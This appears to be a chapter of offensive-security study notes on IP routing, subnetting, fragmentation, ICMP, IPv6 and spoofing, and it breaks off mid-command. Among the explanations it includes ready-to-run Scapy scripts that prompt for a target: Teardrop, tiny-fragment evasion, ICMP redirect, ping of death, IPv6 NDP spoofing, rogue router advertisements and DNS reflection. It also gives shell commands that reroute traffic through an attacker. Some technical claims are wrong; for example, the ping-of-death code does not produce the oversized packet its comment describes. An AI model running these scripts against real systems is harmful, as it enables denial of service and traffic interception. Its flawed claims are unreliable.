1# IP Routing & Fragmentation: The Highway System

---
title: "IP Routing & Fragmentation"
parent: "[[02_Networking]]"
tags:
  - network
  - layer-3
  - routing
  - ipv4
  - ipv6
  - fragmentation
  - subnetting
created: 2026-01-23
updated: 2026-01-24
---

> **Executive Summary**: Layer 3 (Network Layer) is the engine of the Internet. It is responsible for addressing hosts and routing packets across the world. For the hacker, Layer 3 is about understanding *reachability* and *evasion*. How do I get a packet from A to B when C is blocking me? How do I hide data in the structure of the packet itself? This chapter covers the deep internals of IPv4/IPv6, Routing Logic, Fragmentation attacks, and the art of Subnetting for recon.

---

## Table of Contents
1. [Learning Objectives](#1-learning-objectives)
2. [IPv4 Packet Anatomy & Evasion Fields](#2-ipv4-packet-anatomy--evasion-fields)
3. [Routing Logic: How Packets Move](#3-routing-logic-how-packets-move)
4. [Subnetting: The Math of Isolation](#4-subnetting-the-math-of-isolation)
5. [Fragmentation Attacks: Evasion & Denial](#5-fragmentation-attacks-evasion--denial)
6. [ICMP: The Control Plane](#6-icmp-the-control-plane)
7. [IPv6: The New Attack Surface](#7-ipv6-the-new-attack-surface)
8. [Practical Lab: Routing & GRE Tunnels](#8-practical-lab-routing--gre-tunnels)
9. [Advanced IP Spoofing Techniques](#9-advanced-ip-spoofing-techniques)
10. [Network Address Translation (NAT)](#10-network-address-translation-nat)
11. [Advanced Routing Attacks](#11-advanced-routing-attacks)
12. [IP-Based Reconnaissance](#12-ip-based-reconnaissance)
13. [IPv4 vs IPv6 Security Comparison](#13-ipv4-vs-ipv6-security-comparison)
14. [Practical Code Examples](#14-practical-code-examples)
15. [Critical Analysis & Checkpoints](#15-critical-analysis--checkpoints)

---

## 1. Learning Objectives

By the end of this chapter, you will be able to:

- **Master Routing Tables**: Read and manipulate `route` and `ip route` to control traffic flow and pivot through networks.
- **Calculate Subnets**: Instantly identify network boundaries and broadcast addresses using the "Magic Number" method.
- **Weaponize Fragmentation**: Explain how tiny fragments (Teardrop, Bonk) bypass Firewalls/IDS.
- **Analyze ICMP**: Use Redirects and Time Exceeded messages for network mapping.
- **Exploit IPv6**: Understand SLAAC and Neighbor Discovery Protocol (NDP) attacks.
- **Perform IP Spoofing**: Understand when and how to spoof source addresses effectively.
- **Manipulate Routing**: Add custom routes for pivoting and traffic manipulation.
- **Bypass NAT**: Understand NAT traversal techniques.
- **Conduct IP reconnaissance**: Use various techniques to map networks.

---

## 2. IPv4 Packet Anatomy & Evasion Fields

We discussed the header in Chapter 01, but let's focus on the fields that matter for **Routing** and **Evasion**.

### 2.1 Complete IPv4 Header Breakdown

```
IPv4 Header (20-60 bytes):
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options (if IHL > 5)       |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### 2.2 Crucial Fields for Hackers

**TTL (Time To Live)**: 8 bits. Prevents loops. Decremented by 1 at every router.
- *Hack*: If you set TTL=1, the first router drops it and sends back "Time Exceeded". This is how `traceroute` works.
- *Fingerprinting*: Default TTL values identify OS:
  - Linux/Unix: 64
  - Windows: 128
  - Cisco: 255

**Protocol**: 8 bits. Tells the OS what to do with the payload (6=TCP, 17=UDP, 1=ICMP, 47=GRE).

**Source/Dest IP**: 32 bits. The logical addresses.
- *Spoofing*: You can write anything here. But if you spoof the Source IP, you will never see the reply (it goes to the spoofed IP). Blind spoofing is useful for DoS (Reflection attacks) but not for connection establishment.

**Identification (IP ID)**: 16 bits. Used for reassembling fragments.
- *Hack*: Idle Scanning (Zombie Scan) relies on predicting this field.

### 2.3 For Beginners: Understanding IP Addresses

**What is an IP Address?**

Think of it like a postal address for computers - Every device on the internet needs a unique address so data knows where to go.

```
Example: 192.168.1.100

192.168.1   = Network (like your street name)
.100        = Host (like your house number)
```

**Special IP Addresses**:
- `127.0.0.1` = Loopback (talk to yourself/localhost)
- `0.0.0.0` = All interfaces / Default route
- `255.255.255.255` = Broadcast (talk to everyone)
- `192.168.x.x` = Private (home/office networks)
- `10.x.x.x` = Private (large organizations)
- `172.16-31.x.x` = Private (medium organizations)

---

## 3. Routing Logic: How Packets Move

When a host wants to send a packet, it follows a strict decision tree.

### 3.1 The Decision Process

**For Beginners - The Routing Decision**:

When your computer sends data, it must decide: "Can I reach this directly, or do I need help?"

```
Routing Decision Tree:
┌─────────────────────────────────────────┐
│  Want to send packet to: 192.168.5.100 │
└─────────────────┬───────────────────────┘
                  │
                  ▼
         ┌────────────────────┐
         │  Is destination in │
         │   my subnet?       │
         └────────┬───────────┘
                  │
        ┌─────────┴─────────┐
        │                   │
       YES                 NO
        │                   │
        ▼                   ▼
┌───────────────┐   ┌──────────────────┐
│ Send ARP for  │   │ Send ARP for     │
│ destination   │   │ DEFAULT GATEWAY  │
│ MAC address   │   │ MAC address      │
└───────┬───────┘   └────────┬─────────┘
        │                    │
        ▼                    ▼
┌───────────────┐   ┌──────────────────┐
│ Send packet   │   │ Send packet to   │
│ DIRECTLY      │   │ GATEWAY          │
└───────────────┘   └──────────────────┘
```

### 3.2 Routing Table Structure

**Understanding Routing Tables**:

A routing table is like a GPS for your computer - it tells packets where to go.

```
Example Routing Table:

Destination      Gateway         Genmask         Iface
─────────────    ─────────────   ─────────────   ─────
0.0.0.0          192.168.1.1     0.0.0.0         eth0
10.0.0.0         10.0.0.1        255.0.0.0       tun0
192.168.1.0      0.0.0.0         255.255.255.0   eth0
127.0.0.0        0.0.0.0         255.0.0.0       lo

Translation:
─────────────────────────────────────────────────────────
To reach:           Send packet to:
─────────────────   ─────────────────────────────────────
Anything (default)  → Gateway 192.168.1.1 via eth0
10.x.x.x network    → Gateway 10.0.0.1 via tun0 (VPN)
192.168.1.x network → Direct delivery via eth0 (local)
127.x.x.x (self)    → Loopback interface (localhost)
```

**Longest Prefix Match**:
```
Packet destination: 10.5.6.7

Matching routes:
  10.0.0.0/8       (matches, prefix length 8)
  10.5.0.0/16      (matches, prefix length 16) ← WINNER!
  0.0.0.0/0        (matches, prefix length 0)

Rule: Use the most specific (longest prefix) match
```

### 3.3 Viewing Routing Tables

**Linux**:
```bash
# Method 1: route command
route -n

# Method 2: ip route (modern)
ip route show

# Show route to specific destination
ip route get 8.8.8.8
```

**Windows**:
```cmd
# View routing table
route print

# Add route
route add 10.10.10.0 mask 255.255.255.0 192.168.1.50

# Delete route
route delete 10.10.10.0
```

### 3.4 Manipulating Routes for Attacks

**Hacker Trick**: Adding specific routes to force traffic over a VPN or a compromised pivot host.

```bash
# Force traffic to specific IP through VPN
sudo ip route add 1.2.3.4/32 dev tun0

# Route entire subnet through pivot host
sudo ip route add 10.10.10.0/24 via 192.168.1.50

# Change default gateway (DANGEROUS - redirects ALL traffic)
sudo ip route del default
sudo ip route add default via 192.168.1.100  # Attacker's IP
```

---

## 4. Subnetting: The Math of Isolation

Subnetting answers one critical question for a hacker: **"If I compromise this machine, who are its neighbors?"**

Neighbors are accessible via Layer 2 (ARP). Non-neighbors require a Router (Layer 3) and are likely filtered by a Firewall.

### 4.1 For Beginners: What is Subnetting?

**Analogy**: Think of a large office building:

```
Without Subnetting (One Big Network):
┌────────────────────────────────────────────┐
│  Entire Building = 192.168.1.0/24         │
│  Everyone can see everyone's traffic       │
│  - HR sees Engineering packets             │
│  - Guests see server traffic               │
│  - No privacy or security                  │
└────────────────────────────────────────────┘

With Subnetting (Segmented Network):
┌────────────────────────────────────────────┐
│  Floor 1 (HR)        = 192.168.1.0/26      │
│  Floor 2 (Eng)       = 192.168.1.64/26     │
│  Floor 3 (Servers)   = 192.168.1.128/26    │
│  Floor 4 (Guest)     = 192.168.1.192/26    │
│                                             │
│  Each floor isolated, router controls       │
│  access between floors                      │
└────────────────────────────────────────────┘
```

### 4.2 The "Magic Number" Method

Forget binary. Use the Block Size.
1.  Find the **Interesting Octet** (where the mask is not 0 or 255).
2.  Subtract the mask value from **256**. This is your **Block Size**.

### 4.3 Subnet Mask Cheat Sheet

| CIDR    | Subnet Mask       | Magic Number   | Usable IPs | Hosts      | Use Case       |
| :------ | :---------------- | :------------- | :--------- | :--------- | :------------- |
| **/8**  | `255.0.0.0`       | **16,777,216** | 16,777,214 | Huge       | Major ISP      |
| **/16** | `255.255.0.0`     | **65,536**     | 65,534     | Large      | Large Corp     |
| **/24** | `255.255.255.0`   | **256**        | 254        | Standard   | Office LAN     |
| **/25** | `255.255.255.128` | **128**        | 126        | Medium     | Department     |
| **/26** | `255.255.255.192` | **64**         | 62         | Small      | Team           |
| **/27** | `255.255.255.224` | **32**         | 30         | Tiny       | Guest Wi-Fi    |
| **/28** | `255.255.255.240` | **16**         | 14         | Very Small | DMZ            |
| **/29** | `255.255.255.248` | **8**          | 6          | Minimal    | Router Link    |
| **/30** | `255.255.255.252` | **4**          | 2          | P2P        | Point-to-Point |
| **/31** | `255.255.255.254` | **2**          | 2          | Special    | P2P (RFC 3021) |
| **/32** | `255.255.255.255` | **1**          | 1          | Single     | Host Route     |

### 4.4 Practical Calculation

**Scenario**: You compromise a host with IP `192.168.50.67/26`.

**Step-by-Step Calculation**:
```
1. /26 → Subnet mask: 255.255.255.192
2. Interesting octet: 4th octet (192)
3. Magic number: 256 - 192 = 64
4. Subnets start at multiples of 64:
   - 0, 64, 128, 192

5. Which subnet is .67 in?
   - 0-63?    No (67 > 63)
   - 64-127?  YES! (67 is between 64 and 127)

6. Subnet details:
   Network:    192.168.50.64
   First Host: 192.168.50.65
   Last Host:  192.168.50.126
   Broadcast:  192.168.50.127
   
7. Attack target list:
   You can directly reach: .65 - .126 (62 hosts)
   Without crossing a router or firewall!
```

### 4.5 Visual Subnetting Guide

```
VISUAL SUBNET GUIDE:

/24 Network (256 IPs):
┌────────────────────────────────────────────────────────┐
│ 192.168.1.0                                  .255      │
│ [Network]  [Usable IPs: .1-.254]  [Broadcast]         │
└────────────────────────────────────────────────────────┘

Split into 4 /26 subnets (64 IPs each):
┌──────────────┬──────────────┬──────────────┬──────────────┐
│ .0 - .63     │ .64 - .127   │ .128 - .191  │ .192 - .255  │
│ Subnet 1     │ Subnet 2     │ Subnet 3     │ Subnet 4     │
│ 62 hosts     │ 62 hosts     │ 62 hosts     │ 62 hosts     │
└──────────────┴──────────────┴──────────────┴──────────────┘
```

### 4.6 Subnetting Calculator Code

```python
#!/usr/bin/env python3
"""
Quick Subnetting Calculator for Pentesting
"""

def calculate_subnet(ip, cidr):
    """
    Calculate subnet details quickly
    """
    import ipaddress
    
    network = ipaddress.IPv4Network(f"{ip}/{cidr}", strict=False)
    hosts = list(network.hosts())
    
    print(f"\n{'='*60}")
    print(f"SUBNET: {network}")
    print(f"{'='*60}")
    print(f"Network:    {network.network_address}")
    print(f"Netmask:    {network.netmask}")
    print(f"First IP:   {hosts[0] if hosts else 'N/A'}")
    print(f"Last IP:    {hosts[-1] if hosts else 'N/A'}")
    print(f"Broadcast:  {network.broadcast_address}")
    print(f"Hosts:      {len(hosts)}")
    print(f"\n[*] Attack scan range:")
    print(f"    nmap -sn {network}")

# Quick use
if __name__ == "__main__":
    ip = input("IP: ")
    cidr = input("CIDR (/24, /26, etc): ").replace("/", "")
    calculate_subnet(ip, cidr)
```

##  Domain vs Subdomain (DNS world)

A **subdomain** is purely a **name hierarchy**, not a network hierarchy.

Example:

```
example.com        ← main (root) domain
api.example.com    ← subdomain
blog.example.com   ← subdomain

```

In DNS:

- Each name can point to **any IP address**
    
- There is **no requirement** they share the same IP or network
    

Example:

```
example.com       → 93.184.216.34
api.example.com   → 18.203.12.9      (AWS)
blog.example.com  → 151.101.1.140    (Cloudflare)

```

👉 Subdomains are **part of the domain name**, not part of the IP space.

---

##  Subnetting (IP / networking world)

**Subnetting** has _nothing_ to do with domain names.

Subnetting is about:

- Splitting an IP range into smaller networks
    
- Used at the **network routing level**
    

Example:

```
192.168.1.0/24     ← main network
192.168.1.0/26     ← subnet
192.168.1.64/26    ← another subnet

```

Subnetting is:

- About **IP addresses**
    
- Used by routers, firewalls, cloud networks (VPCs)
    

👉 DNS doesn’t care about subnets.

---

##  Key Rule (this clears everything up)

> **DNS maps names → IPs.  
> Subnetting organizes IPs → networks.  
> They are independent systems.**

You _can_ align them — but you are **not required to**.

---

##  When people _think_ subdomains = subnetting

People often _design_ systems like this:

```
web.example.com  → 10.0.1.10
api.example.com  → 10.0.2.10
db.example.com   → 10.0.3.10
```

And those IPs might live in:

```
10.0.1.0/24
10.0.2.0/24
10.0.3.0/24
```

But this is:

- An **organizational choice**
    
- Not a DNS rule
    

👉 DNS is just the label on the door.  
👉 Subnets are how the building is wired inside.

---

## Can subdomains share the same IP?

Absolutely.

```
example.com
www.example.com
shop.example.com
```

All can point to:

```
93.184.216.34
```

The web server uses:

- **Host header**
    
- **SNI (TLS)**  
    to know which site you wanted.
    

---

##  Can one subdomain point to a different country/cloud?

Yes — extremely common.

```
eu.example.com  → EU servers
us.example.com  → US servers
cdn.example.com → CDN edge nodes worldwide
```

Same domain tree, wildly different IP ranges.

---

##  Visual Mental Model (important )

```
DNS (names)                 Networking (IPs)
-------------               ------------------
api.example.com   ───▶      18.203.12.9
blog.example.com  ───▶      151.101.1.140
                              │
                              └── belongs to some subnet
```

DNS stops once it gives you an IP.  
Subnetting starts **after** that.

---
> **Subdomains are part of a domain name hierarchy, not a subnet, and their IP addresses do NOT need to belong to the same network or subnet as the main domain.**
---

## 5. Fragmentation Attacks: Evasion & Denial

Network links have an **MTU (Maximum Transmission Unit)**. Ethernet is usually 1500 bytes.

### 5.1 The Mechanism

If you send a 4000-byte packet:
1.  Router chops it into 3 fragments.
2.  Fragment 1: Offset 0, MF=1.
3.  Fragment 2: Offset 1480, MF=1.
4.  Fragment 3: Offset 2960, MF=0.
5.  Receiver waits for all 3 to reassemble.

### 5.2 For Beginners: Understanding Fragmentation

**Analogy**: Sending a large package through mail:

```
You have a 10-page document to send:
┌──────────────────────────────────────┐
│ Document: 10 pages (too big!)        │
└──────────────────────────────────────┘

Mail service splits it:
┌──────────┬──────────┬──────────┐
│ Envelope1│ Envelope2│ Envelope3│
│ Pages1-3 │ Pages4-6 │ Pages7-10│
│ "1 of 3" │ "2 of 3" │ "3 of 3" │
└──────────┴──────────┴──────────┘

Receiver:
1. Gets envelope 1 → Waits
2. Gets envelope 2 → Waits
3. Gets envelope 3 → Reassembles all pages
```

### 5.3 Fragmentation Attacks

**Teardrop Attack**: Sending overlapping offsets
```
Fragment 1: Bytes 0-1500  (offset 0)
Fragment 2: Bytes 1490-2000 (offset 1490)
             └─ Overlap! (10 bytes)

Old systems crash trying to reassemble
```

**Tiny Fragment Attack**: Splitting TCP header across fragments
```
Fragment 1: 8 bytes (contains Source/Dest Port)
Fragment 2: 12 bytes (contains SYN Flag)

Firewall sees:
- Frag 1: "Port 80, looks OK" ✓
- Frag 2: "No port info, looks OK" ✓

Victim reassembles: Full SYN packet to port 80!
Firewall bypassed!
```

### 5.4 Fragmentation Attack Code

```python
#!/usr/bin/env python3
"""
IP Fragmentation Attacks
"""

from scapy.all import *

def teardrop_attack(target):
    """
    Teardrop attack - overlapping fragments
    """
    print(f"[*] Teardrop attack against {target}")
    
    # Fragment 1
    frag1 = IP(dst=target, id=42, flags="MF", frag=0)
    frag1 /= UDP(dport=7, sport=7)
    frag1 /= "A"*8
    
    # Fragment 2 with overlapping offset
    frag2 = IP(dst=target, id=42, flags=0, frag=1)  # Should be 2, using 1 creates overlap
    frag2 /= "B"*8
    
    send(frag1, verbose=0)
    send(frag2, verbose=0)
    print("[+] Overlapping fragments sent")

def tiny_fragment_attack(target, port):
    """
    Tiny fragment attack to evade firewall
    """
    print(f"[*] Tiny fragment attack: {target}:{port}")
    
    # Create packet
    packet = IP(dst=target)/TCP(dport=port, flags="S")
    
    # Fragment into 8-byte chunks
    fragments = fragment(packet, fragsize=8)
    
    print(f"[*] Fragmented into {len(fragments)} pieces")
    for i, frag in enumerate(fragments, 1):
        print(f"    Fragment {i}: {len(frag)} bytes, offset={frag[IP].frag}")
        send(frag, verbose=0)
    
    print("[+] Tiny fragments sent")

# Example
if __name__ == "__main__":
    target = input("Target IP: ")
    attack = input("Attack (1=teardrop, 2=tiny): ")
    
    if attack == "1":
        teardrop_attack(target)
    elif attack == "2":
        port = int(input("Target port: "))
        tiny_fragment_attack(target, port)
```

---

## 6. ICMP: The Control Plane

It's not just for ping. It is the error reporting mechanism of the internet.

### 6.1 ICMP Message Types

**For Beginners**: ICMP is like the postal service sending you notifications:

```
ICMP Type 0: Echo Reply
  → "Your ping was delivered!"

ICMP Type 3: Destination Unreachable
  → "Sorry, address not found"

ICMP Type 5: Redirect
  → "Use this route instead"

ICMP Type 8: Echo Request
  → "Are you there?" (ping)

ICMP Type 11: Time Exceeded
  → "Packet expired before reaching destination"
```

### 6.2 Crucial Types for Hacking

- **Type 8**: Echo Request (Ping)
- **Type 0**: Echo Reply (Pong)
- **Type 3**: Destination Unreachable (Port Closed/Host Down)
  - Code 0: Network Unreachable
  - Code 1: Host Unreachable
  - Code 3: Port Unreachable
- **Type 5**: **Redirect**
- **Type 11**: Time Exceeded (TTL expired)

### 6.3 ICMP Redirect Attack

Used by routers to tell a host: "Hey, there is a better path to this destination."

**Attack Scenario**:
```
Normal Traffic:
  Victim → Default Gateway → Internet

After ICMP Redirect:
  Attacker sends: "To reach 8.8.8.8, use me as gateway"
  
  Victim → Attacker → Internet
         (MITM!)
```

**Defense**: Most modern OSs ignore ICMP Redirects by default.

### 6.4 Smurf Attack (Broadcast Amplification)

```
Attack Mechanics:
┌─────────────────────────────────────────────┐
│ 1. Attacker sends ICMP Echo Request to:    │
│    192.168.1.255 (broadcast)                │
│    WITH spoofed source: Victim's IP         │
├─────────────────────────────────────────────┤
│ 2. All 254 hosts on subnet receive ping    │
├─────────────────────────────────────────────┤
│ 3. All 254 hosts reply to:                 │
│    Victim's IP!                             │
├─────────────────────────────────────────────┤
│ Result: 1 packet in → 254 packets out      │
│ Victim overwhelmed with ping replies!       │
└─────────────────────────────────────────────┘
```

### 6.5 ICMP Attacks Code

```python
#!/usr/bin/env python3
"""
ICMP-Based Attacks
"""

from scapy.all import *

def icmp_redirect_attack(victim_ip, target_ip, gateway_ip):
    """
    ICMP Redirect attack
    """
    print(f"[*] ICMP Redirect attack")
    print(f"    Victim: {victim_ip}")
    print(f"    Target: {target_ip}")
    print(f"    Fake Gateway: {gateway_ip} (attacker)")
    
    # Create ICMP Redirect packet
    redirect = IP(src=victim_ip, dst=victim_ip) / \
               ICMP(type=5, code=1, gw=gateway_ip) / \
               IP(src=victim_ip, dst=target_ip) / \
               ICMP()
    
    send(redirect, verbose=0)
    print("[+] ICMP Redirect sent")

def ping_of_death(target):
    """
    Ping of Death - oversized ICMP packet
    """
    print(f"[*] Ping of Death: {target}")
    
    # Create oversized packet (>65535 bytes)
    packet = IP(dst=target) / ICMP() / ("X" * 65500)
    
    # Fragment and send
    send(fragment(packet), verbose=0)
    print("[+] Oversized ping sent")

def icmp_scan(network):
    """
    ICMP-based host discovery
    """
    print(f"[*] ICMP ping scan: {network}")
    
    # Send ICMP echo requests
    answered, unanswered = sr(IP(dst=network)/ICMP(), timeout=2, verbose=0)
    
    print(f"\n[+] Found {len(answered)} active hosts:\n")
    for sent, received in answered:
        print(f"    {received.src}")

# Example
if __name__ == "__main__":
    print("""
1. ICMP Redirect attack
2. Ping of Death
3. ICMP host scan
4. Exit
    """)
    
    choice = input("Option: ")
    
    if choice == "1":
        victim = input("Victim IP: ")
        target = input("Target IP: ")
        gateway = input("Fake gateway (attacker): ")
        icmp_redirect_attack(victim, target, gateway)
    
    elif choice == "2":
        target = input("Target IP: ")
        ping_of_death(target)
    
    elif choice == "3":
        network = input("Network (e.g., 192.168.1.0/24): ")
        icmp_scan(network)
```

---

## 7. IPv6: The New Attack Surface

### 7.1 IPv6 Basics for Beginners

**IPv4 vs IPv6**:
```
IPv4 Address:
  192.168.1.1
  - 32 bits
  - 4.3 billion addresses
  - We ran out!

IPv6 Address:
  2001:0db8:85a3:0000:0000:8a2e:0370:7334
  - 128 bits
  - 340 undecillion addresses
  - Enough for every atom on Earth!

Shortened:
  2001:db8:85a3::8a2e:370:7334
  (consecutive zeros can be omitted)
```

### 7.2 No More ARP → Neighbor Discovery Protocol (NDP)

IPv6 doesn't use ARP. It uses ICMPv6 **Neighbor Solicitation (NS)** and **Neighbor Advertisement (NA)**.

**Comparison**:
```
IPv4 (ARP):
  "Who has 192.168.1.1?" (broadcast)
  "I have it, MAC is AA:BB:CC" (reply)

IPv6 (NDP):
  "Who has 2001:db8::1?" (multicast)
  "I have it, MAC is AA:BB:CC" (reply)
  
Attack: Same as ARP spoofing, just different protocol!
```

### 7.3 SLAAC (Stateless Address Auto-Configuration)

Hosts generate their own IPs based on Router Advertisements (RA).

**Attack: Rogue Router Advertisement**:
```
Legitimate RA:
  Router: "Use this prefix: 2001:db8::/64"
  Host: "OK, I'll use 2001:db8::1234"

Rogue RA Attack:
  Attacker: "Use MY prefix: fe80::/64"
  Attacker: "I am the default router!"
  
  Host: "OK, sending all IPv6 traffic to attacker!"
  
Bypass: Many systems prefer IPv6 over IPv4
Result: Attacker becomes MITM for all IPv6 traffic
```

### 7.4 IPv6 Attack Tools

```python
#!/usr/bin/env python3
"""
IPv6 NDP Spoofing (like ARP spoofing)
"""

from scapy.all import *

def ipv6_ndp_spoof(target_ipv6, gateway_ipv6, interface="eth0"):
    """
    IPv6 Neighbor Discovery spoofing
    """
    print(f"[*] IPv6 NDP Spoofing")
    print(f"    Target: {target_ipv6}")
    print(f"    Gateway: {gateway_ipv6}")
    
    # Get our MAC
    our_mac = get_if_hwaddr(interface)
    
    # Send spoofed Neighbor Advertisement to target
    na_target = Ether() / IPv6(dst=target_ipv6) / \
                ICMPv6ND_NA(tgt=gateway_ipv6, R=1, S=1, O=1) / \
                ICMPv6NDOptDstLLAddr(lladdr=our_mac)
    
    # Send spoofed NA to gateway
    na_gateway = Ether() / IPv6(dst=gateway_ipv6) / \
                 ICMPv6ND_NA(tgt=target_ipv6, R=1, S=1, O=1) / \
                 ICMPv6NDOptDstLLAddr(lladdr=our_mac)
    
    print("[*] Sending spoofed NDP packets...")
    for _ in range(10):
        sendp(na_target, iface=interface, verbose=0)
        sendp(na_gateway, iface=interface, verbose=0)
        time.sleep(2)
    
    print("[+] IPv6 NDP spoofing complete")

def rogue_ipv6_router(interface="eth0"):
    """
    Rogue IPv6 Router Advertisement
    """
    print(f"[*] Sending rogue IPv6 Router Advertisement")
    
    # Create rogue RA
    ra = Ether(dst="33:33:00:00:00:01") / \
         IPv6(dst="ff02::1") / \
         ICMPv6ND_RA() / \
         ICMPv6NDOptPrefixInfo(prefix="fe80::", prefixlen=64)
    
    sendp(ra, iface=interface, verbose=0)
    print("[+] Rogue RA sent - hosts may use us as default router")

# Example
if __name__ == "__main__":
    choice = input("1=NDP spoof, 2=Rogue RA: ")
    
    if choice == "1":
        target = input("Target IPv6: ")
        gateway = input("Gateway IPv6: ")
        ipv6_ndp_spoof(target, gateway)
    elif choice == "2":
        rogue_ipv6_router()
```

---

## 8. Practical Lab: Routing & GRE Tunnels

### 8.1 GRE Tunnel Basics

GRE (Generic Routing Encapsulation) creates a virtual link between two routers over the internet.

**Red Team Use**: Bypassing Firewall restrictions by tunneling non-allowed protocols inside IP.

### 8.2 Setting Up GRE Tunnel

**Setup (Linux)**:
```bash
# On Host A (1.1.1.1)
sudo ip tunnel add tun0 mode gre remote 2.2.2.2 local 1.1.1.1 ttl 255
sudo ip link set tun0 up
sudo ip addr add 10.10.10.1/24 dev tun0

# On Host B (2.2.2.2)
sudo ip tunnel add tun0 mode gre remote 1.1.1.1 local 2.2.2.2 ttl 255
sudo ip link set tun0 up
sudo ip addr add 10.10.10.2/24 dev tun0

# Test
ping 10.10.10.2
```

**What Happens**:
```
Before GRE:
  Host A (1.1.1.1) ←→ Internet ←→ Host B (2.2.2.2)
  
After GRE:
  Host A ←→ Virtual Network (10.10.10.0/24) ←→ Host B
  
  Traffic: [IP: 1.1.1.1→2.2.2.2 [GRE [IP: 10.10.10.1→10.10.10.2 [Data]]]]
```

### 8.3 Complete GRE Tunnel Script

```bash
#!/bin/bash
# GRE Tunnel Setup Script

REMOTE_IP=$1
LOCAL_IP=$2
TUNNEL_NET="10.100.100"

if [ -z "$REMOTE_IP" ] || [ -z "$LOCAL_IP" ]; then
    echo "Usage: $0 <remote_ip> <local_ip>"
    exit 1
fi

echo "[*] Setting up GRE tunnel"
echo "    Local: $LOCAL_IP"
echo "    Remote: $REMOTE_IP"
echo "    Tunnel network: $TUNNEL_NET.0/24"

# Create GRE tunnel
sudo ip tunnel add gre1 mode gre remote $REMOTE_IP local $LOCAL_IP ttl 255

# Bring up interface
sudo ip link set gre1 up

# Assign IP (use .1 for first host, .2 for second)
read -p "This host's tunnel IP (.1 or .2): " HOST_NUM
sudo ip addr add $TUNNEL_NET.$HOST_NUM/24 dev gre1

echo "[+] GRE tunnel created!"
echo "[*] Test with: ping $TUNNEL_NET.X"

# Show tunnel
ip tunnel show
```

---

## 9. Advanced IP Spoofing Techniques

### 9.1 When and Why to Spoof

**Blind Spoofing**: When you don't need the response
- DDoS attacks
- Reflection attacks
- Covering tracks

**Problem**: You won't see replies
**Solution**: Only use for one-way attacks

### 9.2 IP Spoofing Code

```python
#!/usr/bin/env python3
"""
IP Spoofing Techniques
"""

from scapy.all import *

def simple_spoof(fake_src, target, message):
    """
    Send packet with spoofed source IP
    """
    packet = IP(src=fake_src, dst=target) / \
             ICMP() / message
    
    send(packet, verbose=0)
    print(f"[+] Sent packet")
    print(f"    Fake source: {fake_src}")
    print(f"    Real destination: {target}")
    print(f"[!] You won't see any reply!")

def reflection_attack(victim_ip, amplifier_ip):
    """
    Reflection/Amplification attack
    """
    # Send DNS query with spoofed source (victim)
    # Amplifier sends large response to victim
    packet = IP(src=victim_ip, dst=amplifier_ip) / \
             UDP(sport=12345, dport=53) / \
             DNS(rd=1, qd=DNSQR(qname="example.com"))
    
    send(packet, verbose=0)
    print(f"[+] Reflection packet sent")
    print(f"    Victim: {victim_ip} (will receive response)")
    print(f"    Amplifier: {amplifier_ip} (sends response)")

# Example
if __name__ == "__main__":
    choice = input("1=Simple spoof, 2=Reflection: ")
    
    if choice == "1":
        fake = input("Fake source IP: ")
        target = input("Target IP: ")
        msg = input("Message: ")
        simple_spoof(fake, target, msg)
    elif choice == "2":
        victim = input("Victim IP: ")
        amplifier = input("Amplifier IP: ")
        reflection_attack(victim, amplifier)
```

---

## 10. Network Address Translation (NAT)

### 10.1 For Beginners: Understanding NAT

**What is NAT?**

NAT allows multiple devices to share one public IP address.

```
Your Home Network:

Inside (Private IPs):           Outside (Public IP):
┌───────────────────┐           ┌──────────────┐
│ Laptop: 192.168.1.10 │        │              │
│ Phone:  192.168.1.11 │─────→  │ 203.0.113.5  │─→ Internet
│ TV:     192.168.1.12 │   NAT  │              │
└───────────────────┘           └──────────────┘

All devices appear as 203.0.113.5 to the internet!
```

### 10.2 NAT Types

**SNAT (Source NAT)**: Changes source IP
```
Inside → Outside:
  Before NAT: 192.168.1.10 → 8.8.8.8
  After NAT:  203.0.113.5  → 8.8.8.8
```

**DNAT (Destination NAT)**: Changes destination IP (Port Forwarding)
```
Outside → Inside:
  Before NAT: Internet → 203.0.113.5:80
  After NAT:  Internet → 192.168.1.10:80 (Web Server)
```

### 10.3 NAT Detection

```python
#!/usr/bin/env python3
"""
Detect if you're behind NAT
"""

import requests

def detect_nat():
    """
    Compare local IP with public IP
    """
    import socket
    
    # Get local IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    
    # Get public IP
    try:
        public_ip = requests.get('https://api.ipify.org').text
    except:
        public_ip = "Unknown"
    
    print(f"Local IP:  {local_ip}")
    print(f"Public IP: {public_ip}")
    
    if local_ip != public_ip:
        print("\n[+] You are behind NAT!")
        print(f"[*] Private IP: {local_ip}")
        print(f"[*] Public IP:  {public_ip}")
    else:
        print("\n[-] Direct internet connection (no NAT)")

if __name__ == "__main__":
    detect_nat()
```

---

## 11. Advanced Routing Attacks

### 11.1 BGP Hijacking (Advanced)

**Border Gateway Protocol** controls internet routing between autonomous systems.

**Attack**: Announce fake routes to redirect internet traffic

```
Normal:
  Users → ISP A → ISP B → Target
  
BGP Hijack:
  Attacker announces: "I have best route to Target!"
  Users → ISP A → Attacker → Target (MITM!)
```

### 11.2 Route Injection

Add malicious routes to compromise systems.

```bash
# On compromised host, redirect traffic
sudo ip route add 10.0.0.0/8 via 192.168.1.ATTACKER

